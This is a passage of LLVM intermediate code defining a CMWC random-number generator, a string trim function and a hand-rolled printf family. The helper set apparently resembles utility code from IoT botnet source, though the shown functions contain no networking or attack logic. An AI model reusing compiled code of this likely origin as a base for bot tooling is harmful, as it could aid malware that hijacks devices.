  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
